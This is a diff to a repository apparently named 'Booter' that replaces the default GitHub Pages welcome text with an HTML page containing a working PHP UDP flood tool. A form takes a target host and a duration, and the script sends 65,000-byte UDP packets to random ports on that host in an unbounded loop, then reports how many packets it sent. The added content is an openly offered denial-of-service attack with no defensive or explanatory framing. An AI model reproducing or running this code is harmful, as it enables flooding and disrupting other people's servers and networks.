@@ -1,37 +1,73 @@
-## Welcome to GitHub Pages
+<html>
+<body>
+<title>
+UDP Flood</title>
+<font color="00FF00">
 
-You can use the [editor on GitHub](https://github.com/DevOnOFW/Booter.github.io/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+<center>
+<STYLE>
+input{
+background-color: #00FF00; font-size: 8pt; color: black; font-family: Tahoma; border: 1 solid white;
+}
+button{
+background-color: #00FF00; font-size: 8pt; color: black; font-family: Tahoma; border: 1 solid white;
+}
+body {
+background-color: black;
+}
+</style>
+</br>
+</br>
+</br>
+</br>
+</br>
+<?php
+//UDP
+if(isset($_GET['host'])&&isset($_GET['time'])){
+    $packets = 0;
+    ignore_user_abort(TRUE);
+    set_time_limit(0);
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+    $exec_time = $_GET['time'];
 
-### Markdown
+    $time = time();
+    //print "Started: ".time('d-m-y h:i:s')."<br>";
+    $max_time = $time+$exec_time;
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+    $host = $_GET['host'];
 
-```markdown
-Syntax highlighted code block
+    for($i=0;$i<65000;$i++){
+    $out .= 'X';
+    }
+    while(1){
+    $packets++;
+    if(time() > $max_time){
+  break;
+    }
+    $rand = rand(1,65000);
+    $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
+    if($fp){
+  fwrite($fp, $out);
+  fclose($fp);
+    }
+    }
+    echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
+    echo '<br><br>
+  <form action="'.$surl.'" method=GET>
+  <input type="hidden" name="act" value="phptools">
+  Host: <br><input type=text name=host><br>
+  Length (seconds): <br><input type=text name=time><br>
+  <input type=submit value=Go></form>';
+}else{ echo '<br><b>UDP Flood</b><br>
+    <form action=? method=GET>
+    <input type="hidden" name="act" value="phptools">
+    Host: <br><input type=text name=host value=><br>
+    Length (seconds): <br><input type=text name=time value=><br><br>
+    <input type=submit value=Go></form>';
+}
+?>
 
-# Header 1
-## Header 2
-### Header 3
+</center>
+</body>
 
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/DevOnOFW/Booter.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+</html>
